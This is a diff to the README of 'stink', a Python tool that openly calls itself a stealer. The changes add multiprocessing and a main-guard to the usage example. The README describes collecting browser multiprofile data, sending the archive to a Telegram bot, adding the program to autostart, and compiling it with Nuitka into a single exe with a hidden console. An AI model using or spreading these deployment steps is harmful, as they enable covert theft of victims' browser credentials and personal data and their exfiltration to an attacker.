@@ -7,7 +7,7 @@
 
 # stink
 
-Stealer in just 2 lines with sending to telegram.
+Stealer in just 3 lines with sending to telegram.
 
 ## Description
 The `stink` already has an impressive functionality that will only expand.
@@ -49,14 +49,16 @@ The `stink` already has an impressive functionality that will only expand.
 3. Support for browser multiprofiles.
 4. Sending an archive of collected data to Telegram.
 5. Execution in a separate thread.
-6. Possibility to add to autostart.
+6. Execution using multiprocessor.
+7. Possibility to add to autostart.
 
 ## Example usage
 ### Standard
 ```python
 from stink import Stealer
 
-Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+if __name__ == '__main__':
+    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 ### Additional parameters
 
@@ -141,7 +143,8 @@ We will need Nuitka to do this.
 ```python
 from stink import Stealer
 
-Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+if __name__ == '__main__':
+    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 
 #### With BAT
@@ -179,7 +182,7 @@ pip install zstandard==0.17.0
 ```
 8. Write the command:
 ```
-nuitka --onefile --windows-disable-console test.py
+nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console test.py
 ```
 
 After executing the command we get the test.exe file with the hidden console.
